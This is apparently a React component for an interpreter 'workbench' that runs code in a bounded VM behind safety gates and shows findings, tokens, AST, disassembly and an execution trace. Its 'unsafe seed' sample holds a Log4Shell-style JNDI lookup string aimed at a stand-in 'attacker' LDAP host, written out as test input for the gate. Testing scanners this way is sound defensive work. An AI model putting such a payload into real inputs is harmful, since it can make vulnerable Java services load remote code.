import { useState } from 'react';
import { useKernelStore } from '@/hooks/use-kernel';
import { Play, RotateCcw, AlertTriangle, ShieldCheck, Zap, Activity, Code, TerminalSquare, Layers, SearchCode } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { SystemLog, MatrixRain } from '@/components/ui-extras';

type TabType = 'overview' | 'execution' | 'compiler' | 'disassembly' | 'trace';

export default function Workbench() {
  const { execute, activeRun, isRunning, resetRun } = useKernelStore();
  
  const safeSeed = 'var mass = 15;\nvar velocity = 4;\nprint 0.5 * mass * velocity ^ 2;';
  const unsafeSeed = '// Unsafe Concept\nconst INGEST_SECRET = "anything";\nfor (let i=0; i<data.length; i++) {\n  pow(-2,0.5);\n  // Payload test\n  ${jndi:ldap://attacker}\n}';

  const [source, setSource] = useState(safeSeed);
  const [activeTab, setActiveTab] = useState<TabType>('overview');

  const loadUnsafe = () => {
    setSource(unsafeSeed);
    setActiveTab('overview');
  };

  const handleExecute = () => {
    execute(source);
  };

  const handleReset = () => {
    resetRun();
    setActiveTab('overview');
  };

  return (
    <div className="flex flex-col gap-4 h-full">
      <div className="flex-none flex items-center justify-between">
        <h2 className="text-xl font-bold tracking-tight uppercase flex items-center gap-2">
          <Zap className="w-5 h-5 text-primary" />
          Primary Workbench
        </h2>
        <div className="flex gap-2">
          <Button data-testid="button-load-safe-seed" variant="outline" size="sm" onClick={() => setSource(safeSeed)}>
            Safe Seed
          </Button>
          <Button data-testid="button-load-unsafe-seed" variant="outline" size="sm" onClick={loadUnsafe} className="text-destructive border-destructive/50 hover:bg-destructive/10">
            Unsafe Seed
          </Button>
        </div>
      </div>

      <div className="flex-1 grid grid-cols-1 lg:grid-cols-12 gap-4 min-h-0">
        
        {/* LEFT COLUMN: Input & Engine Status */}
        <div className="lg:col-span-4 flex flex-col gap-4 h-full">
          <div className="flex-1 border border-border bg-card relative group flex flex-col">
            <div className="bg-muted px-3 py-2 border-b border-border flex justify-between items-center text-xs font-bold uppercase tracking-wider">
              <span>Source Ingestion</span>
              {isRunning && <span className="text-primary animate-pulse">Processing...</span>}
            </div>
            <Textarea 
              data-testid="input-source"
              value={source}
              onChange={(e) => setSource(e.target.value)}
              className="flex-1 resize-none border-0 rounded-none bg-transparent font-mono text-sm focus-visible:ring-0 p-4"
              placeholder="var value = 2 + 3; print value;"
              spellCheck={false}
              disabled={isRunning || !!activeRun}
            />
            {(!activeRun && !isRunning) && (
              <div className="p-3 border-t border-border bg-background/50">
                <Button data-testid="compile" onClick={handleExecute} className="w-full gap-2 font-bold tracking-widest bg-primary text-primary-foreground hover:bg-primary/80 rounded-none">
                  <Play className="w-4 h-4" /> INGEST & TRANSMUTE
                </Button>
              </div>
            )}
            {activeRun && (
              <div className="p-3 border-t border-border bg-background/50">
                <Button data-testid="button-reset-trial" onClick={handleReset} variant="outline" className="w-full gap-2 font-bold tracking-widest rounded-none">
                  <RotateCcw className="w-4 h-4" /> RESET TRIAL
                </Button>
              </div>
            )}
          </div>

          <div className="flex-none border border-border bg-card flex flex-col h-1/3">
            <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider">
              System Telemetry
            </div>
            <div className="p-3 overflow-y-auto flex-1 bg-black/50 relative">
              <MatrixRain />
              {activeRun ? (
                <SystemLog items={activeRun.telemetry} />
              ) : (
                <div className="flex h-full items-center justify-center text-muted-foreground text-xs text-center">
                  Awaiting ingestion...
                </div>
              )}
            </div>
          </div>
        </div>

        {/* RIGHT COLUMN: Results & Agents */}
        <div className="lg:col-span-8 flex flex-col gap-4 h-full overflow-hidden">
          
          <div className="flex-none flex gap-1 border-b border-border pb-2 overflow-x-auto">
            <Button
              variant={activeTab === 'overview' ? 'default' : 'ghost'}
              size="sm"
              className="text-xs font-bold uppercase tracking-wider rounded-none h-8"
              onClick={() => setActiveTab('overview')}
            >
              Overview
            </Button>
            <Button
              variant={activeTab === 'execution' ? 'default' : 'ghost'}
              size="sm"
              className="text-xs font-bold uppercase tracking-wider rounded-none h-8"
              disabled={!activeRun || activeRun.status === 'blocked'}
              onClick={() => setActiveTab('execution')}
            >
              Result & Vars
            </Button>
            <Button
              variant={activeTab === 'compiler' ? 'default' : 'ghost'}
              size="sm"
              className="text-xs font-bold uppercase tracking-wider rounded-none h-8"
              disabled={!activeRun || activeRun.status === 'blocked'}
              onClick={() => setActiveTab('compiler')}
            >
              AST & Tokens
            </Button>
            <Button
              variant={activeTab === 'disassembly' ? 'default' : 'ghost'}
              size="sm"
              className="text-xs font-bold uppercase tracking-wider rounded-none h-8"
              disabled={!activeRun || activeRun.status === 'blocked'}
              onClick={() => setActiveTab('disassembly')}
            >
              Disassembly
            </Button>
            <Button
              variant={activeTab === 'trace' ? 'default' : 'ghost'}
              size="sm"
              className="text-xs font-bold uppercase tracking-wider rounded-none h-8"
              disabled={!activeRun || activeRun.status === 'blocked'}
              onClick={() => setActiveTab('trace')}
            >
              Trace
            </Button>
          </div>

          {activeTab === 'overview' && (
            <div className="flex-1 flex flex-col gap-4 overflow-hidden min-h-0">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 flex-none">
                {/* Promotion Status */}
                <div className="border border-border bg-card p-4 flex flex-col justify-center relative overflow-hidden">
                  <div className="text-xs uppercase text-muted-foreground mb-2 font-bold tracking-widest z-10 relative">Promotion State</div>
                  {!activeRun ? (
                    <div className="text-2xl text-muted-foreground font-light">STANDBY</div>
                  ) : (
                    <div className="flex flex-col gap-2 z-10 relative">
                      <div className="flex items-center gap-3">
                        {activeRun.promotion === 'promoted' ? (
                          <ShieldCheck className="w-8 h-8 text-green-500" />
                        ) : (
                          <AlertTriangle className="w-8 h-8 text-destructive" />
                        )}
                        <span className={`text-2xl font-bold uppercase ${activeRun.promotion === 'promoted' ? 'text-green-500' : 'text-destructive'}`}>
                          {activeRun.status}
                        </span>
                      </div>
                      <p className="text-sm text-foreground/80">{activeRun.promotionReason}</p>
                    </div>
                  )}
                  {activeRun && activeRun.promotion === 'promoted' && (
                    <div className="absolute inset-0 bg-green-500/5 animate-pulse pointer-events-none" />
                  )}
                  {activeRun && activeRun.promotion === 'blocked' && (
                    <div className="absolute inset-0 bg-destructive/10 animate-pulse pointer-events-none" />
                  )}
                </div>

                {/* Findings Ledger */}
                <div className="border border-border bg-card flex flex-col max-h-40 overflow-hidden">
                  <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider flex justify-between">
                    <span>Findings Ledger</span>
                    {activeRun && <span>{activeRun.findings.length} Hits</span>}
                  </div>
                  <div className="p-3 overflow-y-auto flex-1 text-sm">
                    {!activeRun ? (
                      <div className="text-muted-foreground text-xs text-center mt-4">No active trial</div>
                    ) : activeRun.findings.length === 0 ? (
                      <div className="text-green-500 text-xs text-center mt-4 border border-green-500/20 p-2 bg-green-500/5">
                        Safety gates passed. The bounded VM reached HALT.
                      </div>
                    ) : (
                      <div className="space-y-3">
                        {activeRun.findings.map((f) => (
                          <div key={f.id} className="border border-destructive/30 bg-destructive/5 p-2 flex flex-col gap-1">
                            <div className="flex justify-between items-center">
                              <Badge variant="destructive" className="rounded-none text-[10px]">{f.category}</Badge>
                              <span className="text-[10px] text-muted-foreground font-mono">{f.locator}</span>
                            </div>
                            <div className="text-xs">{f.message}</div>
                            <div className="text-[10px] text-destructive/80 font-mono mt-1 break-all bg-black/50 p-1">Evidence: {f.evidence}</div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Bounded Agents Dashboard */}
              <div className="flex-1 border border-border bg-card flex flex-col min-h-0">
                <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider flex items-center gap-2">
                  <Activity className="w-4 h-4 text-primary" />
                  Bounded Agents / Registers
                </div>

                <div className="flex-1 p-4 overflow-y-auto grid grid-cols-1 md:grid-cols-2 gap-6 bg-[#050508]">
                  {!activeRun ? (
                    <div className="col-span-full flex h-full items-center justify-center text-muted-foreground">
                      Awaiting ingestion phase to spin up agent pipeline...
                    </div>
                  ) : (
                    <>
                      <div className="space-y-4">
                        <h3 className="text-xs text-muted-foreground uppercase tracking-widest border-b border-border/50 pb-1">Agent Pipeline</h3>
                        {activeRun.agents.map((a) => (
                          <div key={a.id} className="flex flex-col gap-1 p-2 border border-border bg-card/50">
                            <div className="flex justify-between items-center">
                              <span className="font-bold text-sm text-primary">{a.name}</span>
                              <span className={`text-xs px-2 py-0.5 uppercase tracking-wider ${
                                a.status === 'success' ? 'text-green-500 bg-green-500/10' :
                                a.status === 'blocked' ? 'text-destructive bg-destructive/10' :
                                a.status === 'unsupported' ? 'text-violet-400 bg-violet-500/10' :
                                'text-orange-500 bg-orange-500/10'
                              }`}>
                                {a.status}
                              </span>
                            </div>
                            <div className="text-xs text-muted-foreground">{a.role}</div>
                            <div className="flex justify-between mt-1 text-[10px] font-mono">
                              <span>{a.summary}</span>
                              <span className="text-secondary">{a.durationMs}ms</span>
                            </div>
                          </div>
                        ))}
                      </div>

                      <div className="space-y-4">
                        <h3 className="text-xs text-muted-foreground uppercase tracking-widest border-b border-border/50 pb-1">Virtual Machine State</h3>
                        <div className="grid grid-cols-2 gap-2">
                          {activeRun.registers.map((r) => (
                            <div key={r.register} className="border border-border/50 bg-black p-2 flex flex-col">
                              <div className="flex justify-between items-end">
                                <span className="text-xs font-bold text-secondary">{r.register}</span>
                                <span className="text-[10px] text-muted-foreground">Agent {r.agentId}</span>
                              </div>
                              <span className="text-sm font-mono mt-1 break-all truncate">{r.value}</span>
                              <span className="text-[10px] text-muted-foreground truncate mt-1" title={r.meaning}>{r.meaning}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    </>
                  )}
                </div>
              </div>
            </div>
          )}

          {activeTab === 'execution' && activeRun && (
            <div className="flex-1 border border-border bg-card flex flex-col min-h-0" data-testid="result">
              <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider flex items-center gap-2">
                <TerminalSquare className="w-4 h-4 text-primary" />
                Result & Output
              </div>
              <div className="flex-1 p-4 overflow-y-auto bg-[#050508] grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h3 className="text-xs text-muted-foreground uppercase tracking-widest border-b border-border/50 pb-1 mb-2">Final Result</h3>
                  <div className="text-3xl font-mono text-primary bg-black/50 p-4 border border-border/30">
                    {activeRun.result !== null ? activeRun.result : 'null'}
                  </div>
                </div>
                <div className="flex flex-col min-h-0">
                  <h3 className="text-xs text-muted-foreground uppercase tracking-widest border-b border-border/50 pb-1 mb-2">Standard Output</h3>
                  <pre className="text-xs font-mono text-foreground/80 bg-black p-4 border border-border/30 flex-1 overflow-auto">
                    {activeRun.output.length > 0 ? activeRun.output.join('\n') : '<empty>'}
                  </pre>
                </div>
                <div className="col-span-full mt-4">
                  <h3 className="text-xs text-muted-foreground uppercase tracking-widest border-b border-border/50 pb-1 mb-2">Memory / Variables</h3>
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                    {Object.entries(activeRun.variables || {}).map(([key, val]) => (
                      <div key={key} className="border border-border/50 bg-black p-3 flex flex-col gap-1">
                        <span className="text-xs text-muted-foreground">{key}</span>
                        <span className="text-lg font-mono text-secondary">{String(val)}</span>
                      </div>
                    ))}
                    {Object.keys(activeRun.variables || {}).length === 0 && (
                      <span className="text-xs text-muted-foreground">No variables stored.</span>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'compiler' && activeRun && (
            <div className="flex-1 border border-border bg-card flex flex-col min-h-0">
              <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider flex items-center gap-2">
                <Layers className="w-4 h-4 text-primary" />
                Tokens & AST
              </div>
              <div className="flex-1 p-4 overflow-y-auto bg-[#050508] flex flex-col gap-6">
                <div>
                  <h3 className="text-xs text-muted-foreground uppercase tracking-widest border-b border-border/50 pb-1 mb-3">Lexer Tokens ({activeRun.tokens.length})</h3>
                  <div className="flex flex-wrap gap-2">
                    {activeRun.tokens.map((t, i) => (
                      <span key={i} className="text-[11px] font-mono bg-primary/5 border border-primary/20 text-primary px-2 py-1" title={`line ${t.line}, col ${t.column}`}>
                        {t.kind} <span className="text-foreground/50 ml-1">"{t.lexeme}"</span>
                      </span>
                    ))}
                  </div>
                </div>
                <div className="flex-1 flex flex-col min-h-0">
                  <h3 className="text-xs text-muted-foreground uppercase tracking-widest border-b border-border/50 pb-1 mb-3">Abstract Syntax Tree</h3>
                  <pre className="text-xs font-mono text-foreground/70 bg-black p-4 border border-border/30 overflow-auto flex-1">
                    {activeRun.ast ? JSON.stringify(activeRun.ast, null, 2) : 'null'}
                  </pre>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'disassembly' && activeRun && (
            <div className="flex-1 border border-border bg-card flex flex-col min-h-0">
              <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider flex items-center gap-2">
                <Code className="w-4 h-4 text-primary" />
                Canonical Disassembly
              </div>
              <div className="flex-1 p-4 overflow-y-auto bg-[#050508] font-mono text-sm leading-relaxed">
                {activeRun.canonicalInstructions.length > 0 ? (
                  <div className="space-y-1">
                    {activeRun.canonicalInstructions.map((inst, i) => (
                      <div key={i} className="flex gap-4">
                        <span className="text-muted-foreground w-12 text-right">{String(i).padStart(4, '0')}</span>
                        <span className="text-secondary">{inst}</span>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="text-muted-foreground text-center p-8">No instructions emitted.</div>
                )}
              </div>
            </div>
          )}

          {activeTab === 'trace' && activeRun && (
            <div className="flex-1 border border-border bg-card flex flex-col min-h-0" data-testid="trace">
              <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider flex items-center gap-2">
                <SearchCode className="w-4 h-4 text-primary" />
                VM Step Trace
              </div>
              <div className="flex-1 overflow-y-auto bg-[#050508]">
                <table className="w-full text-xs font-mono text-left border-collapse">
                  <thead className="bg-muted/50 sticky top-0 border-b border-border">
                    <tr>
                      <th className="p-3 font-normal text-muted-foreground w-12 text-right">Step</th>
                      <th className="p-3 font-normal text-muted-foreground w-12 text-right">IP</th>
                      <th className="p-3 font-normal text-muted-foreground w-40">Instruction</th>
                      <th className="p-3 font-normal text-muted-foreground">Stack</th>
                      <th className="p-3 font-normal text-muted-foreground">Output</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-border/20">
                    {activeRun.trace.length > 0 ? (
                      activeRun.trace.map((t, i) => (
                        <tr key={i} className="hover:bg-white/5">
                          <td className="p-3 text-muted-foreground text-right">{t.step}</td>
                          <td className="p-3 text-primary/70 text-right">{t.ip}</td>
                          <td className="p-3 text-secondary font-bold">{t.instruction}</td>
                          <td className="p-3 text-foreground/80 break-all">[{t.stack.join(', ')}]</td>
                          <td className="p-3 text-foreground/60">[{t.output.join(', ')}]</td>
                        </tr>
                      ))
                    ) : (
                      <tr>
                        <td colSpan={5} className="p-8 text-center text-muted-foreground">
                          No execution trace available.
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

        </div>
      </div>
    </div>
  );
}
